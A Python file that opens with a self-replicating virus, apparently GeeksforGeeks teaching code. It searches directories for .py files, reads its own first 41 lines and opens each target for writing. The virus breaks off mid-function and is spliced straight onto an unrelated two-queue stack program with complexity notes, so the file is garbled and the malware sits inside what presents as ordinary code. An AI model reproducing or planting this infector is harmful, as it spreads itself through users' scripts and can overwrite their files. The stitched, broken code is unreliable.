#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Program to implement a stack using
# two queue
from collections import deque
 
class Stack:
     
    def __init__(self):
         
        # Two inbuilt queues
        self.q1 = deque()
        self.q2 = deque()
 
    def push(self, x):
         
        # Push x first in empty q2
        self.q2.append(x)
 
        # Push all the remaining
        # elements in q1 to q2.
        while (self.q1):
            self.q2.append(self.q1.popleft())
 
        # swap the names of two queues
        self.q1, self.q2 = self.q2, self.q1
 
    def pop(self):
 
        # if no elements are there in q1
        if self.q1:
            self.q1.popleft()
 
    def top(self):
        if (self.q1):
            return self.q1[0]
        return None
 
    def size(self):
        return len(self.q1)
 
# Driver Code
if __name__ == '__main__':
    s = Stack()
    s.push(1)
    s.push(2)
    s.push(3)
 
    print("current size: ", s.size())
    print(s.top())
    s.pop()
    print(s.top())
    s.pop()
    print(s.top())
 
    print("current size: ", s.size())
 
# This code is contributed by PranchalK
'''
Time Complexity:
- Push Operation: O(N), as all elements need to be popped out from the Queue (q1) and push them back to Queue (q2)
- Pop Operation: O(1), As we need to remove the front element from the Queue
Space Complexity: O(N), As we use two queues for the implementation of a stack
'''